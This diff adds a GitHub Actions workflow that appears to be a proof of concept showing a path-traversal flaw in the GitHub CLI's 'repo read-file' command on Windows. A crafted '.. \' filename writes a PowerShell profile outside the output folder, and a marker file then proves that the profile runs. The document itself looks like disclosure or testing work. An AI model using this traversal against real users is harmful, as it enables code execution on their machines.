@@ -1,0 +1,61 @@
+name: no_01 read-file Windows containment proof
+
+on:
+  push:
+    branches:
+      - no_01-read-file-windows-poc
+
+permissions:
+  contents: read
+
+jobs:
+  prove:
+    runs-on: windows-latest
+    steps:
+      - name: Download released GitHub CLI
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          Invoke-WebRequest 'https://github.com/cli/cli/releases/download/v2.100.0/gh_2.100.0_windows_amd64.zip' -OutFile gh.zip
+          Expand-Archive gh.zip -DestinationPath gh-release
+          $gh = (Get-ChildItem gh-release -Recurse -Filter gh.exe | Select-Object -First 1).FullName
+          "GH_BIN=$gh" | Out-File -FilePath $env:GITHUB_ENV -Append
+          & $gh --version
+
+      - name: Save one remote file into a chosen directory
+        shell: pwsh
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          $ErrorActionPreference = 'Stop'
+          New-Item -ItemType Directory -Path victim | Out-Null
+          New-Item -ItemType Directory -Path victim/download | Out-Null
+          $victimHome = (Resolve-Path victim).Path
+          $env:USERPROFILE = $victimHome
+          $env:HOME = $victimHome
+          $env:NO01_MARKER_PATH = Join-Path $victimHome 'no_01-profile-rce-marker.txt'
+
+          & $env:GH_BIN repo read-file '.. \Documents\PowerShell\Microsoft.PowerShell_profile.ps1' `
+            --repo '${{ github.repository }}' `
+            --ref '${{ github.sha }}' `
+            --output 'victim\download\'
+
+          $escapedProfile = 'victim\Documents\PowerShell\Microsoft.PowerShell_profile.ps1'
+          if (-not (Test-Path $escapedProfile)) {
+            throw 'The repository-controlled basename did not escape the output directory'
+          }
+          if (Test-Path 'victim\download\Documents\PowerShell\Microsoft.PowerShell_profile.ps1') {
+            throw 'The file unexpectedly stayed in the selected output directory'
+          }
+
+          & pwsh -NoLogo -Command "'child shell started' | Out-Null"
+          if (-not (Test-Path $env:NO01_MARKER_PATH)) {
+            throw 'A new PowerShell process did not execute the escaped profile'
+          }
+          $marker = Get-Content -Raw $env:NO01_MARKER_PATH
+          if ($marker -ne 'GH_READ_FILE_TRAVERSAL_RCE') {
+            throw "Unexpected marker: $marker"
+          }
+          Write-Output 'NO_01_OUTSIDE_WRITE=true'
+          Write-Output 'NO_01_POWERSHELL_PROFILE_EXECUTED=true'
+          Write-Output "NO_01_MARKER=$marker"
